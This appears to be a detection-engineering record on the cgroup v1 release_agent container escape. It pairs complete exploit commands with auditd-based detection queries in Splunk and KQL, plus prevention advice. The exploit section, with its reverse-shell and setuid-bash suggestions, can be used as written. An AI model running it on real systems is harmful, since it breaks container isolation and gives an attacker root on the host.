name: cgroup v1 release_agent privileged-container escape
command: echo <host_script> > /sys/fs/cgroup/<ctrl>/release_agent   # host runs it as root
description: A privileged (or CAP_SYS_ADMIN, SYS_ADMIN-granted) container that can mount a cgroup v1 controller can abuse the release_agent mechanism to execute a command on the HOST as root. The attacker mounts an RDMA (or other) cgroup controller, writes a host-path script into release_agent, enables notify_on_release on a child cgroup, and then empties that cgroup; the kernel runs the release_agent script in the host's root namespace. Classic privileged-container breakout.
notes:
=== WHAT IT IS ===
  cgroup v1 supports a 'release_agent': a host-side program the kernel runs (as root,
  in the host namespace) when the last task leaves a cgroup that has notify_on_release=1.
  A container that can mount a cgroup controller can set release_agent to its own
  script and trigger it -> code execution on the host.

=== PREREQUISITES ===
  # Container must have CAP_SYS_ADMIN (e.g. docker run --privileged or --cap-add=SYS_ADMIN)
  capsh --print | grep sys_admin
  # cgroup v1 present (release_agent does not exist in pure cgroup v2)
  ls /sys/fs/cgroup

=== EXPLOIT (inside the container) ===
  mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
  echo 1 > /tmp/cgrp/x/notify_on_release
  # find this container's path on the host:
  host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
  echo "$host_path/cmd" > /tmp/cgrp/release_agent
  cat > /cmd <<EOF
  #!/bin/sh
  ps aux > $host_path/output
  EOF
  chmod +x /cmd
  # trigger: spawn then exit a process in the child cgroup
  sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
  cat /output      # command ran on the host as root

=== TURN INTO ROOT SHELL ===
  # make /cmd drop a host reverse shell or 'cp /bin/bash /host/tmp/rootbash; chmod 4755 ...'

=== ALTERNATIVES ===
  runc leaky-vessels (CVE-2024-21626); docker-socket abuse; --privileged /dev host-disk mount

defense.why_it_works: cgroup v1's release_agent is a host-side program the kernel executes, as root in the host namespace, when the last process leaves a cgroup with notify_on_release set. A container with CAP_SYS_ADMIN can mount a cgroup controller and write both release_agent and notify_on_release, then empty the cgroup, causing the kernel to run the attacker's script outside the container boundary.
defense.prerequisites: A container running with CAP_SYS_ADMIN (e.g. --privileged or --cap-add=SYS_ADMIN) so it can mount a cgroup v1 controller, and a host exposing cgroup v1 (release_agent does not exist under pure cgroup v2). Knowledge of the container's path on the host (from /etc/mtab).
defense.impact: Arbitrary command execution on the host as root from inside the container - a complete escape of the container isolation boundary.
defense.detection: [MITRE T1611] Writes to a cgroup release_agent file and toggling notify_on_release from within a container; a container mounting a cgroup controller (mount -t cgroup); host-side execution of a script located in a container's overlay/merged directory; unexpected root processes spawned by the kernel/systemd whose path lies in a container layer.
defense.artifacts: auditd records of mount -t cgroup and writes to release_agent / notify_on_release / cgroup.procs; a release_agent pointing at a container overlay path; a host process whose binary resides under /var/lib/docker/overlay2; EDR container-escape alerts.
defense.splunk_spl:
index=linux sourcetype="linux:auditd"
| search (name="*release_agent*" OR name="*notify_on_release*" OR proctitle="*mount -t cgroup*")
| table _time, host, auid, exe, name, proctitle
defense.sentinel_kql:
Syslog
| where SyslogMessage has_any ("release_agent","notify_on_release") or (SyslogMessage has "mount" and SyslogMessage has "-t cgroup")
| project TimeGenerated, Computer, SyslogMessage
| sort by TimeGenerated desc
// container writing cgroup release_agent to run a script on the host (T1611)
defense.sigma_rules: lnx_cgroup_release_agent_escape (write to release_agent + notify_on_release from a container)
defense.prevention: Do not run containers with --privileged or CAP_SYS_ADMIN unless strictly required; drop SYS_ADMIN and all unneeded capabilities. Prefer cgroup v2 (no release_agent). Enforce seccomp/AppArmor/SELinux profiles that block mount and cgroup writes; use user namespaces for containers. Monitor for release_agent writes.

detections.name: cgroup release_agent write from container (escape)
detections.logic:
Syslog
| where SyslogMessage has_any ("release_agent","notify_on_release") or (SyslogMessage has "mount" and SyslogMessage has "-t cgroup")
| project TimeGenerated, Computer, SyslogMessage
detections.false_positives: Legitimate workloads almost never write release_agent; some older container tooling mounts cgroup controllers.
detections.tuning: Alert on any write to a release_agent file from a container context; correlate with a host process running from a container overlay path.
